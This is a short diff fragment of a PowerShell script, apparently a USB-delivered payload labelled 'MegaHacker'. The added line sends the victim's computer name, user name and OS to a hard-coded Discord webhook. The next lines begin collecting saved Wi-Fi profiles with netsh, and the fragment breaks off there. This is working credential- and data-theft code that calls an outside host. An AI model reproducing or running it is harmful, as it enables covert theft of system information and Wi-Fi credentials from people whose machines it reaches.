@@ -1,3 +1,4 @@
+Invoke-RestMethod -ContentType 'Application/Json' -Uri "https://discordapp.com/api/webhooks/1170142170838216744/WSpOKi2cpXc61h0Ync6Ff8UfxwittRG2OScStJsW6f-_91kzb58WdIxHKpOHqJL8G9W9" -Method Post -Body ('{"username": "MegaHacker - '+$env:USBNAME+'","avatar_url": "https://cdn.memegenerator.es/imagenes/memes/full/31/50/31505790.jpg","content": "**Dades:**\r\n     Computer name: '+ $env:COMPUTERNAME +'\r\n     User name: '+ $env:USERNAME +'\r\n     OS: '+ $env:OS +'"}');
 $nw="**Xarxes wifi:**\r\n";
 netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value;
